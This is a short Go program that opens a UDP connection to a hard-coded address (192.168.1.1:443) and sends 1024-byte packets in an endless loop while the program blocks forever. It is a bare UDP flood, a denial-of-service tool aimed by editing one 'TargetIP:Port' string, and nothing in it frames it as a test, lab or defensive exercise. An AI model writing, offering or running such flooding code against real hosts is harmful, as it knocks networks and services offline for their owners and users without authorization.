package main

import (
	"net"
)

func main() {
	target := "192.168.1.1:443" // TargetIP:Port
	payload := make([]byte, 1024)

	conn, _ := net.Dial("udp", target)
	go func() {
		for {
			conn.Write(payload)
		}
	}()
	<-make(chan bool, 1)
}
